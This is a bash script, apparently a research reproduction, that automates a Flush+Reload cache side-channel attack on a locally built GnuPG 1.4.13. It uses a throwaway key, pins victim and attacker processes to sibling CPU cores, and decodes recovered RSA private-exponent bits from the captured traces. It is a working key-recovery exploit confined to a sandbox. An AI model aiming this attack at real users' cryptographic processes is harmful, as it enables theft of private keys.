#!/bin/bash
#
# Flush+Reload attack on GnuPG 1.4.13 -- end to end, self-contained.
#
# Builds everything locally, generates a THROWAWAY RSA key, runs the cache
# side-channel attack, decodes the private exponent from the trace, and reports
# how many key bits were recovered.
#
# SAFE: touches nothing outside this folder. No sudo. No "make install".
# Uses its own isolated GNUPGHOME, so your real ~/.gnupg is never involved.
# The GnuPG it attacks (1.4.13) is built here and never put on your PATH.
#
#   ./run.sh                 # defaults: 30 s capture, auto-pick a core
#   ./run.sh <seconds> <core>
#
set -u
BASE="$(cd "$(dirname "$0")" && pwd)"
WORK="$BASE/work"
MASTIK="$BASE/mastik"
GPGSRC="$WORK/gnupg-1.4.13"
GPG="$GPGSRC/g10/gpg"
export GNUPGHOME="$WORK/gnupghome"      # isolated keyring; never ~/.gnupg
DURATION="${1:-30}"
VCORE="${2:-}"

say(){ printf '\n\033[1;36m==> %s\033[0m\n' "$*"; }
die(){ printf '\033[1;31mERROR: %s\033[0m\n' "$*" >&2; exit 1; }

mkdir -p "$WORK"

# ---------------------------------------------------------------- dependencies
for t in gcc make python3 tar taskset; do
  command -v "$t" >/dev/null || die "'$t' not found. See README.md (Requirements)."
done

# ----------------------------------- build Mastik + GnuPG + key (all local) ---
say "Building (Mastik + GnuPG 1.4.13 + test key -- all local, no sudo, no install)"
if [ ! -f "$MASTIK/src/libmastik.a" ]; then
  ( cd "$MASTIK" && ./configure >/dev/null 2>&1 && make >/dev/null 2>&1 ) || die "Mastik build failed"
  grep -q 'HAVE_DEBUG_SYMBOLS 1' "$MASTIK/demo/config.h" 2>/dev/null \
    || die "Mastik built WITHOUT debug symbols. Install binutils-dev libdwarf-dev libelf-dev (see README)."
fi
if [ ! -x "$GPG" ]; then
  [ -d "$GPGSRC" ] || tar xjf "$BASE/gnupg-1.4.13.tar.bz2" -C "$WORK"
  ( cd "$GPGSRC" && ./configure --disable-nls \
       CFLAGS="-g -O0 -fcommon -std=gnu89" >/dev/null 2>&1 && make >/dev/null 2>&1 ) \
       || die "GnuPG build failed (see $GPGSRC/config.log)"
fi
"$GPG" --version | head -1 | grep -q '1.4.13' || die "gpg build is not 1.4.13"
# fresh throwaway key EVERY run, so dp/dq differ each time (builds stay cached)
rm -rf "$GNUPGHOME"; mkdir -p "$GNUPGHOME"; chmod 700 "$GNUPGHOME"
"$GPG" --batch --gen-key "$BASE/src/keygen.batch" >/dev/null 2>&1 || die "key generation failed"
echo "Build OK  (GnuPG $("$GPG" --version | head -1 | awk '{print $NF}') built locally; fresh test key generated for this run; your system gpg and ~/.gnupg are untouched)"

# ------------------------------------------------ pick an SMT sibling pair -----
pick_pair(){
  for d in /sys/devices/system/cpu/cpu[0-9]*/topology/thread_siblings_list; do
    read -r list < "$d"
    set -- $(echo "$list" | tr ',-' ' ')
    [ $# -ge 2 ] && [ "$1" != "$2" ] && { echo "$1 $2"; return; }
  done
}
if [ -n "$VCORE" ]; then
  sib="$(tr ',-' ' ' < /sys/devices/system/cpu/cpu$VCORE/topology/thread_siblings_list 2>/dev/null)"
  ACORE=""; for c in $sib; do [ "$c" != "$VCORE" ] && ACORE=$c && break; done
else
  read -r VCORE ACORE < <(pick_pair)
fi
[ -n "${ACORE:-}" ] || die "No SMT sibling pair found. This CPU may have Hyper-Threading disabled; see issue.md."

# ------------------------------------------------------- calibrate this CPU ---
say "Calibrating Flush+Reload for this machine"
gcc -O2 -I "$MASTIK" -o "$WORK/calibrate" "$BASE/src/calibrate.c" \
    -L "$MASTIK/src" -lmastik -ldwarf -lelf -lbfd 2>/dev/null || die "calibrate build failed"
CAL="$(taskset -c "$ACORE" "$WORK/calibrate" "$GPG")" || die "calibration failed"   # prints to stderr
eval "$CAL"                                   # sets THRESHOLD and SLOT
gcc -O2 -I "$MASTIK" -I "$MASTIK/demo" -DTHRESHOLD=$THRESHOLD -DSLOT=$SLOT \
    -o "$WORK/FR-attack" "$BASE/src/FR-attack.c" \
    -L "$MASTIK/src" -lmastik -ldwarf -lelf -lbfd 2>/dev/null || die "FR-attack build failed"

# ------------------------------------------------- capture + decode ------------
say "Capturing traces for ${DURATION}s (victim on core $VCORE, attacker on sibling core $ACORE)"
cp "$GPGSRC/README" "$WORK/msg.txt"
GNUPGHOME="$GNUPGHOME" taskset -c "$VCORE" \
  bash -c "while true; do '$GPG' --yes -b '$WORK/msg.txt' >/dev/null 2>&1; done" &
VICTIM=$!
trap 'kill $VICTIM 2>/dev/null' EXIT
sleep 1
timeout "$DURATION" taskset -c "$ACORE" "$WORK/FR-attack" "$GPG" > "$WORK/trace.out" 2>/dev/null
kill $VICTIM 2>/dev/null; trap - EXIT

"$GPG" --export-secret-keys > "$WORK/seckey.gpg" 2>/dev/null
python3 -I "$BASE/src/parse_key.py" "$WORK/seckey.gpg" "$WORK/groundtruth.txt" >/dev/null \
  || die "key parse failed"
python3 -I "$BASE/src/decode.py" "$WORK/trace.out" "$WORK/groundtruth.txt"

echo ""
echo "Artifacts in $WORK (delete to reset).  If results look wrong, read issue.md."
